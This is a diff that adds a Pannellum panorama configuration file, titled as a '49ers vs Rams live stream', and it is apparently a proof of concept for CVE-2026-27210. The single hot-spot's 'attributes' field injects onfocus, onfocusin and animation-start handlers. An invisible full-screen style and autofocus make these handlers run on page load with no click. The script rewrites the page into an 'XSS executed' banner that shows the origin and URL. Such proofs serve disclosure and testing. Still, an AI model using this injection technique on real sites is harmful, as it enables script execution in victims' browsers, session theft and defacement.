@@ -1,0 +1,26 @@
+{
+  "type": "equirectangular",
+  "autoLoad": true,
+  "showControls": false,
+  "title": "49ers vs Rams live stream",
+  "panorama": "https://cdn.jsdelivr.net/gh/mpetroff/pannellum@2.5.6/examples/examplepano.jpg",
+  "hotSpots": [
+    {
+      "pitch": 0,
+      "yaw": 0,
+      "type": "info",
+      "text": " ",
+      "URL": "https://example.com/",
+      "attributes": {
+        "autofocus": "autofocus",
+        "tabindex": "1",
+        "contenteditable": "true",
+        "onfocus": "(function(){if(window.__pnXss)return;window.__pnXss=1;document.open();document.write(\"<!DOCTYPE html><html><head><meta charset=\\\"utf-8\\\"><title>Pannellum XSS proof</title><style>body{margin:0;font:14px/1.5 -apple-system,BlinkMacSystemFont,sans-serif;background:#0b1220;color:#e8eef7;padding:28px}h1{color:#34d399;font-size:20px;margin:0 0 8px}code{color:#99f6e4;word-break:break-all}.box{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px 16px;margin-top:14px}</style></head><body><h1>XSS executed (CVE-2026-27210)</h1><p>Hot-spot <code>attributes</code> ran without a click and replaced the viewer document.</p><div class=\\\"box\\\"><div>origin</div><code id=\\\"o\\\"></code><div style=\\\"margin-top:8px\\\">href</div><code id=\\\"h\\\"></code></div><script>document.getElementById(\\\"o\\\").textContent=location.origin;document.getElementById(\\\"h\\\").textContent=location.href;</script></body></html>\");document.close();})()",
+        "onfocusin": "(function(){if(window.__pnXss)return;window.__pnXss=1;document.open();document.write(\"<!DOCTYPE html><html><head><meta charset=\\\"utf-8\\\"><title>Pannellum XSS proof</title><style>body{margin:0;font:14px/1.5 -apple-system,BlinkMacSystemFont,sans-serif;background:#0b1220;color:#e8eef7;padding:28px}h1{color:#34d399;font-size:20px;margin:0 0 8px}code{color:#99f6e4;word-break:break-all}.box{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px 16px;margin-top:14px}</style></head><body><h1>XSS executed (CVE-2026-27210)</h1><p>Hot-spot <code>attributes</code> ran without a click and replaced the viewer document.</p><div class=\\\"box\\\"><div>origin</div><code id=\\\"o\\\"></code><div style=\\\"margin-top:8px\\\">href</div><code id=\\\"h\\\"></code></div><script>document.getElementById(\\\"o\\\").textContent=location.origin;document.getElementById(\\\"h\\\").textContent=location.href;</script></body></html>\");document.close();})()",
+        "onanimationstart": "(function(){if(window.__pnXss)return;window.__pnXss=1;document.open();document.write(\"<!DOCTYPE html><html><head><meta charset=\\\"utf-8\\\"><title>Pannellum XSS proof</title><style>body{margin:0;font:14px/1.5 -apple-system,BlinkMacSystemFont,sans-serif;background:#0b1220;color:#e8eef7;padding:28px}h1{color:#34d399;font-size:20px;margin:0 0 8px}code{color:#99f6e4;word-break:break-all}.box{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px 16px;margin-top:14px}</style></head><body><h1>XSS executed (CVE-2026-27210)</h1><p>Hot-spot <code>attributes</code> ran without a click and replaced the viewer document.</p><div class=\\\"box\\\"><div>origin</div><code id=\\\"o\\\"></code><div style=\\\"margin-top:8px\\\">href</div><code id=\\\"h\\\"></code></div><script>document.getElementById(\\\"o\\\").textContent=location.origin;document.getElementById(\\\"h\\\").textContent=location.href;</script></body></html>\");document.close();})()",
+        "onwebkitanimationstart": "(function(){if(window.__pnXss)return;window.__pnXss=1;document.open();document.write(\"<!DOCTYPE html><html><head><meta charset=\\\"utf-8\\\"><title>Pannellum XSS proof</title><style>body{margin:0;font:14px/1.5 -apple-system,BlinkMacSystemFont,sans-serif;background:#0b1220;color:#e8eef7;padding:28px}h1{color:#34d399;font-size:20px;margin:0 0 8px}code{color:#99f6e4;word-break:break-all}.box{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px 16px;margin-top:14px}</style></head><body><h1>XSS executed (CVE-2026-27210)</h1><p>Hot-spot <code>attributes</code> ran without a click and replaced the viewer document.</p><div class=\\\"box\\\"><div>origin</div><code id=\\\"o\\\"></code><div style=\\\"margin-top:8px\\\">href</div><code id=\\\"h\\\"></code></div><script>document.getElementById(\\\"o\\\").textContent=location.origin;document.getElementById(\\\"h\\\").textContent=location.href;</script></body></html>\");document.close();})()",
+        "style": "position:fixed;inset:0;width:100vw;height:100vh;opacity:0.01;animation:pnlm-mv 0.01s"
+      }
+    }
+  ]
+}
